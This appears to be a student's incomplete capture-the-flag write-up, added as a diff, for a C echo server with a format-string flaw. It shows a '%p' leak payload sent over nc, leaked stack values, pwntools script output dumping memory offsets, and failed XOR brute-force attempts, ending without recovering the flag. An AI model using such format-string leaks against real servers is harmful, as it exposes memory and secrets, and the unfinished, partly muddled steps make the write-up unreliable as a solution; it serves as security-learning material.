@@ -1,0 +1,161 @@
+Challenge:
+Company X recently migrated its high-traffic TCP servers from Python to C to squeeze out more performance. 
+In the rush, their developers overlooked the finer details of C’s low-level I/O. 
+One of these servers guards the credentials to their production database. 
+On the surface it behaves like a simple echo server — but subtle flaws in its implementation may reveal far more than intended. 
+To make things harder, the secret isn’t stored neatly in one place. 
+The flag is split across memory and the flag is encrypted anew every time a client connects with a basic algorithm. 
+With the right approach, though, you can still piece it together. Can you exploit the server’s careless coding and recover the full flag?
+Challenge by: Manas G 
+
+nc 0.cloud.chals.io 23963
+
+Solution:
+We get to know the challenge is a memory leak challenge from the desc so we try basic mem access first:
+$ nc 0.cloud.chals.io 23963
+hello%p.%p.%p.%p
+
+this give us:
+seed@seedvm2004:~$ nc 0.cloud.chals.io 23963
+tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
+IP 10.1.0.20.43578 > yourserver.9000: Flags [S], seq 915041645, win 64240, options [mss 1460,sackOK,TS val 1758169200 ecr 0,nop,wscale 7], length 0
+IP yourserver.9000 > 10.1.0.20.43578: Flags [S.], seq 1234567890, ack 915041646, win 65535, options [mss 1460,sackOK,TS val 1758169220 ecr 1758169200,nop,wscale 7], length 0
+IP 10.1.0.20.43578 > yourserver.9000: Flags [.], ack 915041646, win 501, options [TS val 1758169240 ecr 1758169220], length 0
+
+Enter your input:
+hello%p.%p.%p.%p
+hello0x7ffe1797f9c0.0x15aad30.0x7f1cf400c770.0x15aacf0
+
+then we run a leak_fmt script to extract fragments of data:
+[+] Opening connection to 0.cloud.chals.io on port 23963: Done
+[*] Closed connection to 0.cloud.chals.io port 23963
+[+] offset  23: len=562 
+    'tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes\nIP 10.1.0.20.48974 > yourserver.9000: Flags [S], seq 1994418406, win 64240, options [mss 1460,sackOK,TS val 175816941'
+
+[+] Opening connection to 0.cloud.chals.io on port 23963: Done
+[*] Closed connection to 0.cloud.chals.io port 23963
+[+] offset  24: len=562 
+    'tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes\nIP 10.1.0.20.49034 > yourserver.9000: Flags [S], seq 1389594965, win 64240, options [mss 1460,sackOK,TS val 175816941'
+
+[+] Opening connection to 0.cloud.chals.io on port 23963: Done
+[*] Closed connection to 0.cloud.chals.io port 23963
+[+] offset  25: len=562 
+    'tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes\nIP 10.1.0.20.41062 > yourserver.9000: Flags [S], seq 1635494245, win 64240, options [mss 1460,sackOK,TS val 175816942'
+
+[+] Opening connection to 0.cloud.chals.io on port 23963: Done
+[*] Closed connection to 0.cloud.chals.io port 23963
+[+] offset  26: len=562 
+    'tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes\nIP 10.1.0.20.41174 > yourserver.9000: Flags [S], seq 4174840738, win 64240, options [mss 1460,sackOK,TS val 175816942'
+
+[+] Opening connection to 0.cloud.chals.io on port 23963: Done
+[*] Closed connection to 0.cloud.chals.io port 23963
+[+] offset  27: len=562 
+    'tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes\nIP 10.1.0.20.41246 > yourserver.9000: Flags [S], seq 4111073555, win 64240, options [mss 1460,sackOK,TS val 175816942'
+
+[+] Opening connection to 0.cloud.chals.io on port 23963: Done
+[*] Closed connection to 0.cloud.chals.io port 23963
+[+] offset  28: len=562 
+    'tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes\nIP 10.1.0.21.41088 > yourserver.9000: Flags [S], seq 1181401550, win 64240, options [mss 1460,sackOK,TS val 175816943'
+
+[+] Opening connection to 0.cloud.chals.io on port 23963: Done
+[*] Closed connection to 0.cloud.chals.io port 23963
+[+] offset  29: len=562 
+    'tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes\nIP 10.1.0.20.34396 > yourserver.9000: Flags [S], seq 3406603841, win 64240, options [mss 1460,sackOK,TS val 175816943'
+
+[+] Opening connection to 0.cloud.chals.io on port 23963: Done
+
+this shows us that data isnt being leaked properly
+
+We fix this by tcpdumping the data being leaked:
+pranavhemanth@Pranavs-MacBook-Pro-M3 Format Blunder?!? %python3 leak_fmt.py 
+[+] Opening connection to 0.cloud.chals.io on port 23963: Done
+/Users/pranavhemanth/Code/Academics/CNS-S5/CTF-18th-Sept/Format Blunder?!?/leak_fmt.py:119: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  r.sendline(payload)
+[*] Closed connection to 0.cloud.chals.io port 23963
+[+] offset   1: len=  7 
+    '54623\n\n'
+
+[+] Opening connection to 0.cloud.chals.io on port 23963: Done
+[*] Closed connection to 0.cloud.chals.io port 23963
+[+] offset   2: len= 14 
+    '231f44b489bb\n\n'
+
+[+] Opening connection to 0.cloud.chals.io on port 23963: Done
+[*] Closed connection to 0.cloud.chals.io port 23963
+[+] offset   3: len= 12 
+    '72762a4e8e\n\n'
+
+[+] Opening connection to 0.cloud.chals.io on port 23963: Done
+[*] Closed connection to 0.cloud.chals.io port 23963
+[+] offset   4: len= 14 
+    'c4cd7cd24e0a\n\n'
+
+[+] Opening connection to 0.cloud.chals.io on port 23963: Done
+[*] Closed connection to 0.cloud.chals.io port 23963
+[+] offset   5: len= 12 
+    '0ec2cbd6a5\n\n'
+
+[+] Opening connection to 0.cloud.chals.io on port 23963: Done
+[*] Closed connection to 0.cloud.chals.io port 23963
+[+] Opening connection to 0.cloud.chals.io on port 23963: Done
+[*] Closed connection to 0.cloud.chals.io port 23963
+[+] Opening connection to 0.cloud.chals.io on port 23963: Done
+[*] Closed connection to 0.cloud.chals.io port 23963
+[+] Opening connection to 0.cloud.chals.io on port 23963: Done
+[*] Closed connection to 0.cloud.chals.io port 23963
+[+] Opening connection to 0.cloud.chals.io on port 23963: Done
+[*] Closed connection to 0.cloud.chals.io port 23963
+[+] offset  10: len=  8 
+    '(null)\n\n'
+
+[+] Opening connection to 0.cloud.chals.io on port 23963: Done
+[*] Closed connection to 0.cloud.chals.io port 23963
+[+] offset  11: len=  8 
+    '(null)\n\n'
+
+[+] Opening connection to 0.cloud.chals.io on port 23963: Done
+[*] Closed connection to 0.cloud.chals.io port 23963
+[+] offset  12: len=  8 
+    '(null)\n\n'
+
+[+] Opening connection to 0.cloud.chals.io on port 23963: Done
+[*] Closed connection to 0.cloud.chals.io port 23963
+[+] offset  13: len=  8 
+    '(null)\n\n'
+
+[+] Opening connection to 0.cloud.chals.io on port 23963: Done
+
+here we get the offsets of data leaked:
+offset  1: '54623\n\n'
+offset  2: '231f44b489bb\n\n'
+offset  3: '72762a4e8e\n\n'
+offset  4: 'c4cd7cd24e0a\n\n'
+offset  5: '0ec2cbd6a5\n\n'
+
+Joining the data from the fragments gives us:
+pranavhemanth@Pranavs-MacBook-Pro-M3 Format Blunder?!? %python3 solve.py   
+[+] Encrypted flag bytes: b'\x05F##\x1fD\xb4\x89\xbbrv*N\x8e\xc4\xcd|\xd2N\n\x0e\xc2\xcb\xd6\xa5'
+pranavhemanth@Pranavs-MacBook-Pro-M3 Format Blunder?!? %
+
+Now we run different XOR keys to break this:
+pranavhemanth@Pranavs-MacBook-Pro-M3 Format Blunder?!? %python3 xor_solve.py
+[+] Encrypted flag bytes: b'\x05F##\x1fD\xb4\x89\xbbrv*N\x8e\xc4\xcd|\xd2N\n\x0e\xc2\xcb\xd6\xa5'
+[*] Trying keys of length 1...
+[*] Trying keys of length 2...
+[*] Trying keys of length 3...
+[*] Trying keys of length 4...
+
+Retrying with script updates:
+pranavhemanth@Pranavs-MacBook-Pro-M3 Format Blunder?!? %python3 xor_solve.py
+[+] Fragment 1 decrypted with key 0x60: e&C
+[!] Fragment 2 could not be decrypted with a single-byte XOR key
+[!] Fragment 3 could not be decrypted with a single-byte XOR key
+[!] Fragment 4 could not be decrypted with a single-byte XOR key
+[!] Fragment 5 could not be decrypted with a single-byte XOR key
+
+[+] Full decrypted flag (combined fragments):
+[!] Non-ASCII characters present, printing raw bytes:
+b'e&C#\x1fD\xb4\x89\xbbrv*N\x8e\xc4\xcd|\xd2N\n\x0e\xc2\xcb\xd6\xa5'
+pranavhemanth@Pranavs-MacBook-Pro-M3 Format Blunder?!? %
+
+Trying different bruteforce attempts did not work :(
